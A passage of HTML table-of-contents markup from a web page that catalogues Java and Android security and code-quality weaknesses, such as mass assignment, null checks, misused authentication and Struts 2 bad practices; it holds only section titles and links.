class="toc-number">1.1.29.</span> <span class="toc-text">Mass Assignment: Insecure Binder Configuration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-28"><span class="toc-number">1.1.29.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-28"><span class="toc-number">1.1.29.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-28"><span class="toc-number">1.1.29.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-26"><span class="toc-number">1.1.29.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mass-Assignment-Request-Parameters-Bound-into-Persisted-Objects"><span class="toc-number">1.1.30.</span> <span class="toc-text">Mass Assignment: Request Parameters Bound into Persisted Objects</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-29"><span class="toc-number">1.1.30.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-29"><span class="toc-number">1.1.30.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-29"><span class="toc-number">1.1.30.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-27"><span class="toc-number">1.1.30.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Missing-Check-against-Null"><span class="toc-number">1.1.31.</span> <span class="toc-text">Missing Check against Null</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-30"><span class="toc-number">1.1.31.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-30"><span class="toc-number">1.1.31.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-30"><span class="toc-number">1.1.31.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-28"><span class="toc-number">1.1.31.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Missing-Check-for-Null-Parameter"><span class="toc-number">1.1.32.</span> <span class="toc-text">Missing Check for Null Parameter</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-31"><span class="toc-number">1.1.32.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-31"><span class="toc-number">1.1.32.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-31"><span class="toc-number">1.1.32.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-29"><span class="toc-number">1.1.32.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Object-Model-Violation-Erroneous-clone-Method"><span class="toc-number">1.1.33.</span> <span class="toc-text">Object Model Violation: Erroneous clone() Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-32"><span class="toc-number">1.1.33.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-32"><span class="toc-number">1.1.33.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-32"><span class="toc-number">1.1.33.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-30"><span class="toc-number">1.1.33.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Object-Model-Violation-Just-one-of-equals-and-hashCode-Defined"><span class="toc-number">1.1.34.</span> <span class="toc-text">Object Model Violation: Just one of equals() and hashCode() Defined</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-33"><span class="toc-number">1.1.34.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-33"><span class="toc-number">1.1.34.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-33"><span class="toc-number">1.1.34.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-31"><span class="toc-number">1.1.34.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Object-Model-Violation-Just-one-of-restoreState-and-saveState-Defined"><span class="toc-number">1.1.35.</span> <span class="toc-text">Object Model Violation: Just one of restoreState() and saveState() Defined</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-34"><span class="toc-number">1.1.35.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-34"><span class="toc-number">1.1.35.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-34"><span class="toc-number">1.1.35.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-32"><span class="toc-number">1.1.35.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-Android-Permission-Check"><span class="toc-number">1.1.36.</span> <span class="toc-text">Often Misused: Android Permission Check</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-35"><span class="toc-number">1.1.36.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-35"><span class="toc-number">1.1.36.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-35"><span class="toc-number">1.1.36.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-33"><span class="toc-number">1.1.36.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-Authentication"><span class="toc-number">1.1.37.</span> <span class="toc-text">Often Misused: Authentication</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-36"><span class="toc-number">1.1.37.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-36"><span class="toc-number">1.1.37.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-36"><span class="toc-number">1.1.37.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-34"><span class="toc-number">1.1.37.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-Boolean-getBoolean"><span class="toc-number">1.1.38.</span> <span class="toc-text">Often Misused: Boolean.getBoolean()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-37"><span class="toc-number">1.1.38.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-37"><span class="toc-number">1.1.38.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-37"><span class="toc-number">1.1.38.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-35"><span class="toc-number">1.1.38.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-Encoding"><span class="toc-number">1.1.39.</span> <span class="toc-text">Often Misused: Encoding</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-38"><span class="toc-number">1.1.39.1.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-38"><span class="toc-number">1.1.39.2.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-36"><span class="toc-number">1.1.39.3.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-File-System"><span class="toc-number">1.1.40.</span> <span class="toc-text">Often Misused: File System</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-38"><span class="toc-number">1.1.40.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-39"><span class="toc-number">1.1.40.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-39"><span class="toc-number">1.1.40.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-37"><span class="toc-number">1.1.40.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-File-Upload"><span class="toc-number">1.1.41.</span> <span class="toc-text">Often Misused: File Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-39"><span class="toc-number">1.1.41.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-40"><span class="toc-number">1.1.41.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-40"><span class="toc-number">1.1.41.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-38"><span class="toc-number">1.1.41.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-Privilege-Management"><span class="toc-number">1.1.42.</span> <span class="toc-text">Often Misused: Privilege Management</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-40"><span class="toc-number">1.1.42.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-41"><span class="toc-number">1.1.42.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-41"><span class="toc-number">1.1.42.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-39"><span class="toc-number">1.1.42.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-Spring-Remote-Service"><span class="toc-number">1.1.43.</span> <span class="toc-text">Often Misused: Spring Remote Service</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-41"><span class="toc-number">1.1.43.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-42"><span class="toc-number">1.1.43.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-42"><span class="toc-number">1.1.43.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-40"><span class="toc-number">1.1.43.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-Spring-Web-Service"><span class="toc-number">1.1.44.</span> <span class="toc-text">Often Misused: Spring Web Service</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-42"><span class="toc-number">1.1.44.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-43"><span class="toc-number">1.1.44.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-43"><span class="toc-number">1.1.44.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-41"><span class="toc-number">1.1.44.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Explicit-Call-to-finalize"><span class="toc-number">1.1.45.</span> <span class="toc-text">Poor Style: Explicit Call to finalize()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-43"><span class="toc-number">1.1.45.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-44"><span class="toc-number">1.1.45.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-44"><span class="toc-number">1.1.45.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-42"><span class="toc-number">1.1.45.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Bad-Practices-Application-Map-Tampering"><span class="toc-number">1.1.46.</span> <span class="toc-text">Struts 2 Bad Practices: Application Map Tampering</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-44"><span class="toc-number">1.1.46.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-45"><span class="toc-number">1.1.46.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-45"><span class="toc-number">1.1.46.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-43"><span class="toc-number">1.1.46.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Bad-Practices-Dynamic-Method-Invocation"><span class="toc-number">1.1.47.</span> <span class="toc-text">Struts 2 Bad Practices: Dynamic Method Invocation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-45"><span class="toc-number">1.1.47.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-46"><span class="toc-number">1.1.47.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-46"><span class="toc-number">1.1.47.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-44"><span class="toc-number">1.1.47.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Bad-Practices-Request-Map-Tampering"><span class="toc-number">1.1.48.</span> <span class="toc-text">Struts 2 Bad Practices: Request Map Tampering</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-46"><span class="toc-number">1.1.48.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-47"><span class="toc-number">1.1.48.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-47"><span class="toc-number">1.1.48.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-45"><span class="toc-number">1.1.48.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Bad-Practices-Session-Map-Tampering"><span class="toc-number">1.1.49.</span> <span class="toc-text">Struts 2 Bad Practices: Session Map Tampering</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-47"><span class="toc-number">1.1.49.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-48"><span class="toc-number">1.1.49.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-48"><span class="toc-number">1.1.49.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-46"><span class="toc-number">1.1.49.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unchecked-Return-Value"><span class="toc-number">1.1.50.</span> <span class="toc-text">Unchecked Return Value</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-48"><span class="toc-number">1.1.50.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-49"><span class="toc-number">1.1.50.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-49"><span class="toc-number">1.1.50.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-47"><span class="toc-number">1.1.50.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码质量"><span class="toc-number">1.2.</span> <span class="toc-text">代码质量</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Android-Bad-Practices-Use-of-Internal-APIs"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">Android Bad Practices: Use of Internal APIs</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-49"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-50"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-50"><span class="toc-number">1.2.0.4.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-48"><span class="toc-number">1.2.0.5.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Bad-Practices-Use-of-Released-Camera-Resource"><span class="toc-number">1.2.1.</span> <span class="toc-text">Android Bad Practices: Use of Released Camera Resource</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-50"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-51"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-51"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-49"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Bad-Practices-Use-of-Released-Media-Resource"><span class="toc-number">1.2.2.</span> <span class="toc-text">Android Bad Practices: Use of Released Media Resource</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-51"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-52"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-52"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-50"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Bad-Practices-Use-of-Released-SQLite-Resource"><span class="toc-number">1.2.3.</span> <span class="toc-text">Android Bad Practices: Use of Released SQLite Resource</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-52"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-53"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-53"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-51"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Byte-Array-to-String-Conversion"><span class="toc-number">1.2.4.</span> <span class="toc-text">Code Correctness: Byte Array to String Conversion</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-53"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-54"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-54"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-52"><span class="toc-number">1.2.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Call-to-Thread-run"><span class="toc-number">1.2.5.</span> <span class="toc-text">Code Correctness: Call to Thread.run()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-54"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-55"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-55"><span class="toc-number">1.2.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-56"><span class="toc-number">1.2.5.4.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-53"><span class="toc-number">1.2.5.5.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Erroneous-Zero-Value"><span class="toc-number">1.2.6.</span> <span class="toc-text">Code Correctness: Erroneous Zero Value</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-55"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-56"><span class="toc-number">1.2.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-57"><span class="toc-number">1.2.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-54"><span class="toc-number">1.2.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Hidden-Method"><span class="toc-number">1.2.7.</span> <span class="toc-text">Code Correctness: Hidden Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-56"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-57"><span class="toc-number">1.2.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-58"><span class="toc-number">1.2.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-55"><span class="toc-number">1.2.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Incorrect-serialPersistentFields-Modifier"><span class="toc-number">1.2.8.</span> <span class="toc-text">Code Correctness: Incorrect serialPersistentFields Modifier</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-57"><span class="toc-number">1.2.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-58"><span class="toc-number">1.2.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-59"><span class="toc-number">1.2.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-56"><span class="toc-number">1.2.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Invalid-Call-to-Object-equals"><span class="toc-number">1.2.9.</span> <span class="toc-text">Code Correctness: Invalid Call to Object.equals()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-58"><span class="toc-number">1.2.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-59"><span class="toc-number">1.2.9.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-60"><span class="toc-number">1.2.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-57"><span class="toc-number">1.2.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Misleading-Method-Signature"><span class="toc-number">1.2.10.</span> <span class="toc-text">Code Correctness: Misleading Method Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-59"><span class="toc-number">1.2.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-60"><span class="toc-number">1.2.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-61"><span class="toc-number">1.2.10.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-58"><span class="toc-number">1.2.10.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Non-Static-Inner-Class-Implements-Serializable"><span class="toc-number">1.2.11.</span> <span class="toc-text">Code Correctness: Non-Static Inner Class Implements Serializable</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-60"><span class="toc-number">1.2.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-61"><span class="toc-number">1.2.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-62"><span class="toc-number">1.2.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-59"><span class="toc-number">1.2.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Non-Synchronized-Method-Overrides-Synchronized-Method"><span class="toc-number">1.2.12.</span> <span class="toc-text">Code Correctness: Non-Synchronized Method Overrides Synchronized Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-61"><span class="toc-number">1.2.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 